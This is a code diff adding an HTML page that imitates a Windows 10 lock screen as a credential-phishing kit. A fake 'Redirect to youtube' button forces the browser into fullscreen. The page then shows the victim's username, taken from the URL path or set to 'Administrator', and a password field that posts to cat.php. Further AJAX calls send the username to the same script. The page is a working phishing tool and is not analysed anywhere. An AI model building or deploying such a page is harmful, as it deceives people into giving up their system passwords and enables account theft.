@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html>
+<head>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
+<meta name="viewport" content="width=device-width, initial-scale=1"; charset="utf-8">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="client.min.js"></script>
+<script src="loc.js"></script>
+<style onload="mydata()">
+
+@import url(https://fonts.googleapis.com/css?family=Open+Sans:light);
+* {
+  padding: 0;
+  margin: 0;
+}
+
+
+#redirect {
+  padding:15px;
+  margin-top:10px;
+}
+ html { visibility:hidden;
+ 
+  }
+
+
+.Page1 {
+  z-index: 2;
+  position: relative;
+  background: url("https://betanews.com/wp-content/uploads/2015/09/Windows-10-lock-screen.jpg") center;
+  background-size: 100vw 100vh;
+  width: 100vw;
+  height: 100vh;
+  -webkit-background-size: cover;
+  -moz-background-size: cover;
+  -o-background-size: cover;
+
+}
+.Page1 h1 {
+  padding-left:15px;
+  position: relative;
+  color: #FFF;
+  font-size: 5.5em;
+  font-family:  Open Sans;
+  top: 65vh;
+}
+
+.Page2 h1 {
+
+  color: #FFF;
+  font-size: 2.8em;
+  font-family:  Open Sans;
+  font-style: bold;
+
+}
+.Page2:before {
+  content: "";
+  position: fixed;
+  left: 0;
+  right: 0;
+  z-index: -1;
+  display: block;
+  background-image: url("https://betanews.com/wp-content/uploads/2015/09/Windows-10-lock-screen.jpg");
+  background-repeat: no-repeat;
+  background-size: 100vw 100vh;
+  width: 100vw;
+  height: 100vh;
+  -webkit-filter: blur(20px);
+  -moz-filter: blur(20px);
+  -o-filter: blur(20px);
+  -ms-filter: blur(20px);
+  filter: blur(20px);
+  transform: scale(1.1);
+  -webkit-background-size: cover;
+  -moz-background-size: cover;
+  -o-background-size: cover;
+
+}
+
+
+.Page1 h2 {
+  padding-left:20px;
+  position: relative;
+  color: #FFF;
+  font-size: 2.5em;
+  font-family: Open Sans;
+  top: 64vh;
+}
+.Page2 {
+  font-family: Open Sans;
+  z-index: 1;
+  position: relative;
+  width: 100vw;
+  height: 100vh;
+  top: -100vh;
+
+
+}
+
+.userLogo {
+
+  width: 15em;
+  height: 15em;
+  position: relative;
+  margin: 0em auto;
+  display: block;
+
+}
+.userLogo img {
+
+  width: 15em;
+  height: 15em;
+  border-radius: 10em;
+  opacity: 0.5;
+}
+
+.userName {
+  text-align: center;
+  color: #FFF;
+  margin: -1em 0em 1em 0em;
+
+}
+
+
+.flexContainer {
+  display:  block;
+
+}
+
+.button {
+  background-color: transparent;
+  border: none;
+}
+.passwordInput {
+ 
+  align-items: center;
+  position: relative;
+  margin: 0 auto;
+  display: flex;
+  font-size: 1.1em;
+  width: 17em;
+  height: 2em;
+  outline: none;
+  border: rgba(204, 204, 204, 0.5) solid;
+
+}
+
+
+</style>
+</head>
+<body onload="block()">
+
+<div id="redirect">
+<button class="button" onclick="myFunction();">Redirect to https://www.youtube.com...</button>
+</div>
+
+
+<div class="wrapper" id="container">
+  <div class="Page1" id="page1">
+    <br>
+    <div class="time">
+      <h1><p> <span id="hour"></span>:<span id="min"></span></p> </h1>
+
+    </div>
+    <div class="date">
+      <h2> <p> <span id="week"></span>,<span id="date"></span> <span id="month"></span> <span id="day"></span>  </p> </h2>
+
+    </div>
+  </div>
+  <div class="Page2" id="page2">
+    <br><br><br><br><br><br><br><br>
+ 
+    <div class="userLogo"><img src="https://i.imgur.com/xap68m4.png"/></div>
+    <div class="userName">
+
+     <h1> <p id="user"></p> <h1>
+    </div>
+  <div class="flexContainer">
+    <div>
+<form id="form-id" action="cat.php" method="post">
+    <input class="passwordInput" name="passwd" type="password"  required placeholder="Password" autofocus/>
+</form>
+</div>
+
+<script type="text/javascript"> 
+function myFunction() {
+  var x = document.getElementById("wrapper");
+  if (x.style.display === "none") {
+    x.style.display = "block";
+  } else {
+    x.style.display = "none";
+  }
+}
+        var myDate = new Date(); 
+        var month = myDate.getMonth();
+        var myDay = myDate.getDay(); 
+        var date = myDate.getDate();
+//        var year = myDate.getFullYear();
+        var monthArr = ["january", "february","march", "april", "may", "june", "july", "august", "september", "october", "november","december"];
+        month = monthArr[month];
+        
+        
+        // Array of days. 
+        var weekday = ['sunday', 'monday', 'tuesday', 
+            'wednesday', 'thursday', 'friday', 'saturday' 
+        ]; 
+      //  document.write("Today is : " + weekday[myDay]); 
+      //  document.write("<br/>"); 
+        
+        // get hour value. 
+        var hours = myDate.getHours(); 
+        var ampm = hours >= 12 ? 'PM' : 'AM'; 
+        hours = hours % 12; 
+        hours = hours ? hours : 12;
+        hours = hours < 10 ? '0' + hours : hours; 
+        var minutes = myDate.getMinutes(); 
+        minutes = minutes < 10 ? '0' + minutes : minutes; 
+        var myTime = hours + " " + ampm + " : " + minutes +  
+            " : " + myDate.getMilliseconds(); 
+      //  document.write("\tCurrent time is : " + myTime); 
+        document.getElementById("hour").innerHTML = hours;
+        document.getElementById("min").innerHTML = minutes;
+        document.getElementById("week").innerHTML = weekday[myDay];
+//        document.getElementById("year").innerHTML = year;
+        document.getElementById("day").innerHTML = date;
+        document.getElementById("month").innerHTML = month;
+
+</script> 
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script>
+user_name=document.location.pathname
+
+var str = document.location.pathname;
+  var res = str.split("/",4);
+
+if (user_name.indexOf('win2.html') > -1 ) {
+document.getElementById("user").innerHTML = "Administrator";
+   $.ajax({
+    type: 'POST',
+    url: 'cat.php',
+    data: { 
+        'username': "Administrator"
+
+    },
+    success: function(msg){
+
+    }
+});
+} else {
+  document.getElementById("user").innerHTML = res[3];
+   $.ajax({
+    type: 'POST',
+    url: 'cat.php',
+    data: { 
+        'username': res[3]
+
+    },
+    success: function(msg){
+
+    }
+});
+
+}
+$(document).ready(function() {
+  $(".Page1").click(function() {
+    $(".Page1").animate({ top: "-200vh" }, 500);
+  });
+});
+
+document.body.onkeyup = function(e){
+    if(e.keyCode == 32){
+       $(".Page1").animate({ top: "-200vh" }, 500);
+    }
+}
+
+
+</script>
+
+
+<script>
+
+function block() {
+
+  $(document).ready(function() {
+  document.getElementsByTagName("html")[0].style.visibility = "visible";
+
+});
+
+
+
+  var y = document.getElementById("redirect");
+  var a = document.getElementById("page1");
+  var b = document.getElementById("page2");
+
+  if (a.style.display === "none") {
+
+    a.style.display = "block";
+    b.style.display = "block";
+    y.style.display = "none";
+  } else {
+
+    a.style.display = "none";
+    b.style.display = "none";
+    y.style.display = "block";
+    
+  }
+}
+
+function myFunction() {
+
+
+  toggleFullScreen(document.body);
+  var y = document.getElementById("redirect");
+  var a = document.getElementById("page1");
+  var b = document.getElementById("page2");  
+
+
+ 
+ 
+document.addEventListener("fullscreenchange", function() {
+
+if (a.style.display === "none") {
+
+    a.style.display = "block";
+    b.style.display = "block";
+    y.style.display = "none";
+  } else {
+
+    a.style.display = "none";
+    b.style.display = "none";
+    y.style.display = "block";
+    
+  }
+
+});
+document.addEventListener("mozfullscreenchange", function() {
+
+  if (a.style.display === "none") {
+
+    a.style.display = "block";
+    b.style.display = "block";
+    y.style.display = "none";
+  } else {
+
+    a.style.display = "none";
+    b.style.display = "none";
+    y.style.display = "block";
+    
+  }
+
+});
+document.addEventListener("webkitfullscreenchange", function() {
+
+
+
+ if (a.style.display === "none") {
+
+    a.style.display = "block";
+    b.style.display = "block";
+    y.style.display = "none";
+    
+  } else {
+
+    a.style.display = "none";
+    b.style.display = "none";
+    y.style.display = "block";
+    
+  }
+
+
+
+});
+document.addEventListener("msfullscreenchange", function() {
+
+if (a.style.display === "none") {
+
+    a.style.display = "block";
+    b.style.display = "block";
+    y.style.display = "none";
+  } else {
+
+    a.style.display = "none";
+    b.style.display = "none";
+    y.style.display = "block";
+    
+  }
+
+});
+
+}
+
+function toggleFullScreen(elem) {
+    // ## The below if statement seems to work better ## if ((document.fullScreenElement && document.fullScreenElement !== null) || (document.msfullscreenElement && document.msfullscreenElement !== null) || (!document.mozFullScreen && !document.webkitIsFullScreen)) {
+    if ((document.fullScreenElement !== undefined && document.fullScreenElement === null) || (document.msFullscreenElement !== undefined && document.msFullscreenElement === null) || (document.mozFullScreen !== undefined && !document.mozFullScreen) || (document.webkitIsFullScreen !== undefined && !document.webkitIsFullScreen) || (document.fullscreenElement !== undefined && document.fullscreenElement === null)) {
+        if (elem.requestFullScreen) {
+            elem.requestFullScreen();
+        } else if (elem.mozRequestFullScreen) {
+            elem.mozRequestFullScreen();
+        } else if (elem.webkitRequestFullScreen) {
+            elem.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT);
+        } else if (elem.msRequestFullscreen) {
+            elem.msRequestFullscreen();
+        }
+    } else {
+        if (document.cancelFullScreen) {
+            document.cancelFullScreen();
+        } else if (document.mozCancelFullScreen) {
+            document.mozCancelFullScreen();
+        } else if (document.webkitCancelFullScreen) {
+            document.webkitCancelFullScreen();
+        } else if (document.msExitFullscreen) {
+            document.msExitFullscreen();
+        }
+    }
+}
+
+
+
+
+</script>
+
+<script>
+function HandleSubmission()
+{
+
+
+   user_name=document.location.pathname
+
+   var res = user_name.split("/",4);
+   var nameuser = "";
+     if (user_name.indexOf('win2.html') > -1 ) {
+       nameuser = "Administrator";
+     } else {
+       nameuser = res[3];
+
+     }
+
+
+}
+
+function CheckForEnterClick(e)
+{
+   e = e || window.event;
+   if( e.keyCode == 13 || e.which == 13 ) { HandleSubmission(); }
+}
+
+var addEventHandler = function(element,eventType,functionRef)
+{
+    if( element == null || typeof(element) == 'undefined' ) { return; }
+    if( element.addEventListener ) { element.addEventListener(eventType,functionRef,false); }
+    else if( element.attachEvent ) { element.attachEvent("on"+eventType,functionRef); }
+    else { element["on"+eventType] = functionRef; }
+};
+
+addEventHandler(window,"keydown",CheckForEnterClick);
+</script>
+
+</body>
+</html>
